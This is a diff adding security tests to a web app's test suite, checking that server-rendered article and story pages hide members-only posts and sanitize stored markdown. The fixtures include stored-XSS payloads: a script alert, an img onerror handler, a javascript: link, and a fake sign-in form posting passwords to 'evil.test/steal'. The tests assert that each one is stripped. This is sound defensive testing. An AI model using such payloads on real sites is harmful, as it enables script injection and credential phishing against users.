@@ -108,6 +108,7 @@ describe('Perspectives crawlability routes', () => {
     expect(res.text).toContain('[Perspectives RSS feed](<https://agenticadvertising.org/perspectives/feed.xml>)');
     expect(res.text).not.toContain('# AdCP - Ad Context Protocol');
     expect(queryMock).toHaveBeenCalledWith(expect.stringContaining("p.status = 'published'"), [200]);
+    expect(queryMock).toHaveBeenCalledWith(expect.stringContaining('p.is_members_only = false'), [200]);
   });
 
   it('normalizes legacy URLs, fails closed on controls, and contains Markdown delimiters', async () => {
@@ -195,6 +196,7 @@ describe('Perspectives crawlability routes', () => {
     expect(res.status).toBe(200);
     expect(res.text).toContain('https://agenticadvertising.org/perspectives/agentic-crawlability');
     expect(queryMock).toHaveBeenCalledWith(expect.stringContaining("p.content_type = 'article'"));
+    expect(queryMock).toHaveBeenCalledWith(expect.stringContaining('p.is_members_only = false'));
     expect(queryMock).toHaveBeenCalledWith(expect.stringContaining("p.source_type IS NULL OR p.source_type NOT IN ('rss', 'email')"));
   });
 
@@ -229,6 +231,140 @@ describe('Perspectives crawlability routes', () => {
     expect(queryMock).toHaveBeenCalledWith(
       expect.stringContaining("p.status = 'published'"),
       ['does-not-exist']
+    );
+  });
+
+  it('server-renders published perspective content and sanitizes stored markdown', async () => {
+    queryMock.mockResolvedValueOnce({
+      rows: [{
+        slug: 'crawlable-article',
+        title: 'Crawlable <Perspective>',
+        subtitle: 'Readable before JavaScript runs',
+        category: 'Research',
+        excerpt: 'An article that crawlers can read.',
+        content: '## Initial HTML\n\nThe complete article body is here.\n\n| Safe | Table |\n| --- | --- |\n| Cell | Value |\n\n<script>alert("stored-xss")</script>\n\n<img src="x" onerror="alert(1)">\n\n<form action="https://evil.test/steal" style="position:fixed;inset:0"><input type="password"><button>Sign in</button></form>',
+        author_name: 'Avery Writer',
+        author_title: 'Editor',
+        author_slug: 'avery-writer',
+        featured_image_url: null,
+        published_at: new Date('2026-06-01T12:00:00Z'),
+        updated_at: new Date('2026-06-02T12:00:00Z'),
+        tags: ['agentic', 'research'],
+        like_count: 4,
+      }],
+    });
+
+    const httpApp = app();
+    const res = await request(httpApp)
+      .get('/perspectives/crawlable-article')
+      .set('Host', 'agenticadvertising.org');
+
+    expect(res.status).toBe(200);
+    expect(res.text).toContain('<title id="pageTitle">Crawlable &lt;Perspective&gt; | AgenticAdvertising.org</title>');
+    expect(res.text).toContain('<h1 id="heroTitle">Crawlable &lt;Perspective&gt;</h1>');
+    expect(res.text).toContain('<h2>Initial HTML</h2>');
+    expect(res.text).toContain('The complete article body is here.');
+    expect(res.text).toContain('<table>');
+    expect(res.text).toContain('<td>Cell</td>');
+    expect(res.text).toContain('href="/community/people/avery-writer"');
+    expect(res.text).toContain('id="loadingState" class="loading-state" hidden');
+    expect(res.text).toContain('data-server-rendered="true"');
+    expect(res.text).not.toContain('alert("stored-xss")');
+    expect(res.text).not.toContain('onerror="alert(1)"');
+    expect(res.text).not.toContain('<form');
+    expect(res.text).not.toContain('<input');
+    expect(res.text).not.toContain('position:fixed');
+    expect(res.text).not.toContain('evil.test');
+    expect(queryMock).toHaveBeenCalledWith(
+      expect.stringContaining('p.is_members_only = false'),
+      ['crawlable-article']
+    );
+
+  });
+
+  it('server-renders Stories cards and news while retaining safe link boundaries', async () => {
+    queryMock
+      .mockResolvedValueOnce({
+        rows: [
+          {
+            slug: 'official-report',
+            title: 'Official <Report>',
+            subtitle: null,
+            category: 'Research',
+            excerpt: 'The official summary.',
+            external_url: null,
+            author_name: 'Avery Writer',
+            featured_image_url: null,
+            published_at: new Date('2026-06-01T12:00:00Z'),
+            tags: ['strategy'],
+            content_origin: 'official',
+          },
+          ...Array.from({ length: 6 }, (_, index) => ({
+            slug: `official-report-${index + 2}`,
+            title: `Official report ${index + 2}`,
+            subtitle: null,
+            category: 'Research',
+            excerpt: `Official summary ${index + 2}.`,
+            external_url: null,
+            author_name: 'Avery Writer',
+            featured_image_url: null,
+            published_at: new Date('2026-05-31T12:00:00Z'),
+            tags: ['strategy'],
+            content_origin: 'official',
+          })),
+          {
+            slug: 'member-view',
+            title: 'Member View',
+            subtitle: null,
+            category: 'Perspective',
+            excerpt: 'A member contribution.',
+            external_url: 'javascript:alert(1)',
+            author_name: 'Casey Member',
+            featured_image_url: null,
+            published_at: new Date('2026-05-30T12:00:00Z'),
+            tags: ['agentic'],
+            content_origin: 'member',
+          },
+        ],
+      })
+      .mockResolvedValueOnce({
+        rows: [{
+          title: 'Industry &amp; Agents',
+          source_url: 'https://news.example/agents',
+          summary: 'A useful &amp; safe summary.',
+          addie_notes: null,
+          relevance_tags: ['ai-agents'],
+          feed_name: 'Example News',
+        }],
+      });
+
+    const httpApp = app();
+    const res = await request(httpApp).get('/stories').set('Host', 'agenticadvertising.org');
+
+    expect(res.status).toBe(200);
+    expect(res.text).toContain('Official &lt;Report&gt;');
+    expect(res.text).toContain('Official report 7');
+    expect(res.text).toContain('href="/perspectives/member-view"');
+    expect(res.text).not.toContain('javascript:alert(1)');
+    expect(res.text).toContain('href="https://news.example/agents"');
+    expect(res.text).toContain('Industry &amp; Agents');
+    expect(res.text).toContain('A useful &amp; safe summary.');
+    expect(queryMock).toHaveBeenCalledTimes(2);
+    expect(queryMock.mock.calls[0][0]).toContain('p.is_members_only = false');
+
+  });
+
+  it('keeps members-only perspectives out of the anonymous JSON API', async () => {
+    queryMock.mockResolvedValueOnce({ rows: perspectiveRows });
+
+    const res = await request(app())
+      .get('/api/perspectives')
+      .set('Host', 'agenticadvertising.org');
+
+    expect(res.status).toBe(200);
+    expect(queryMock).toHaveBeenCalledWith(
+      expect.stringContaining('p.is_members_only = false'),
+      [100]
     );
   });
 
